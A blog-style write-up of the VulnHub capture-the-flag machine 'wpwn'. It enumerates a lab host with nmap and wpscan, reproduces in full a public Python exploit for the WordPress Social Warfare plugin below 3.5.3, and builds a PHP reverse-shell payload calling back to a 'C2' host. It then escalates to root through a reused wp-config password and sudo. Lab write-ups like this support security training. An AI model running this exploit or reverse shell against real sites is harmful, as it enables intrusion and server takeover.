---
layout: post
author: H4
---

# PG VULNHUB 
[Details](https://www.vulnhub.com/entry/wpwn-1,537/)

## enumeration

Using `nmap` to identify the attack surface of the target server.

### nmap
```bash
$ nmap -Pn 192.168.55.123 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 14:53 EST
Nmap scan report for 192.168.55.123
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

### dir buster

```bash
$ dirb http://192.168.55.123
```
-> `/wordpress/`  
So `dirb` identified that there is a `wordpress` installation.

### scan wordpress

Now we are using `wpscan` to check if we can identify vulnerabilities related to the `wordpress` installation.

```bash
wpscan --url http://192.168.55.123/wordpress/                                                                                                                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®?
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.55.123/wordpress/ [192.168.55.123]
[+] Started: Fri Dec 31 14:38:48 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
[+] XML-RPC seems to be enabled: http://192.168.55.123/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.55.123/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.55.123/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.55.123/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.55.123/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5</generator>
 |  - http://192.168.55.123/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5</generator>
 
 [+] WordPress theme in use: twentytwenty
 | Location: http://192.168.55.123/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.55.123/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://192.168.55.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.55.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:
[+] social-warfare
 | Location: http://192.168.55.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.55.123/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.55.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.55.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.55.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.55.123/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Fri Dec 31 14:38:53 2021
[+] Requests Done: 188
[+] Cached Requests: 5
[+] Data Sent: 49.368 KB
[+] Data Received: 17.881 MB
[+] Memory used: 238.926 MB
[+] Elapsed time: 00:00:04
```
If we have a closer look at the output we see that the plugin `social warfare 3.5.2` is used.  
Searching for an exploit using `searchsploit` reveals the installed version is vulnerable to an `rce`.

```bash
$ searchsploit social warfare      
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                                                                                                                           | php/webapps/46794.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

---

## exploitation
### social warfsare plugin < 3.5.3 exploit

- [Details](https://www.exploit-db.com/exploits/46794)
- Author: hash3liZer

```python
import sys
import requests
import re
import urlparse
import optparse

class EXPLOIT:

	VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

	def __init__(self, _t, _p):
		self.target  = _t
		self.payload = _p

	def engage(self):
		uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )
		r = requests.get( uri )
		if r.status_code == 500:
			print "[*] Received Response From Server!"
			rr  = r.text
			obj = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
			if obj:
				resp = obj.groups()[0]
				if resp:
					print "[<] Received: "
					print resp.replace( "lnbreak", "\n" )
				else:
					sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
			else:
				sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
		else:
			sys.exit( "[~] Unexpected Status Received!" )

def main():
	parser = optparse.OptionParser(  )

	parser.add_option( '-t', '--target', dest="target", default="", type="string", help="Target Link" )
	parser.add_option( ''  , '--payload-uri', dest="payload", default="", type="string", help="URI where the file payload.txt is located." )

	(options, args) = parser.parse_args()

	print "[>] Sending Payload to System!"
	exploit = EXPLOIT( options.target, options.payload )
	exploit.engage()

if __name__ == "__main__":
	main()
```

### exploitation
Create a file shell.txt with the following content.

```
<pre>system('php -r \'$sock=fsockopen("C2",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'')</pre>
```

Now we start our netcat listener on the attacker machine.

```
$ nc -lvp 1234
```

Execute the exploit script

```bash
$ python2 46794.py -t http://192.168.55.123/wordpress/ --payload-uri http://c2/shell.txt
```

Catching the connect from the target.

```bash
$ nc -lvp 1234                                                                     
listening on [any] 1234 ...
192.168.55.123: inverse host lookup failed: Unknown host
connect to [192.168.55.200] from (UNKNOWN) [192.168.55.123] 35760
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Yay we got a shell!

### first flag
```bash
$ pwd
/var/www
$ cat local.txt
a*****************************d
```
-> `a*****************************d`

## privilege escalation

Having a closer look at the `wordpress` config file and which user exist on the system gives us an indication how to elevate our privileges.

```bash
$ pwd
/var/www/html/wordpress
$ cat wp-config.php
...
/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
$ ls /home
takis
```

So we identified that the user `takis` exists and that the `wordpress` installation uses a complicated database password (`R3&]vzhHmMn9,:-5`).  
It is worth a test to ssh into the machine with ```takis:R3&]vzhHmMn9,:-5```.

```bash
ssh takis@192.168.55.123
takis@wpwn:~$
```

It worked! Now we check if `takis` is able switch to the user `root`

```
takis@wpwn:~$ sudo su
root@wpwn:/home/takis#
```

We got root access. Get the second flag now :-)

```
root@wpwn:/home/takis# cd /root
root@wpwn:~# ls
proof.txt  root.txt
root@wpwn:~# cat proof.txt 
f****************************1
```
-> f****************************1  
  
Pwned! <@:-)
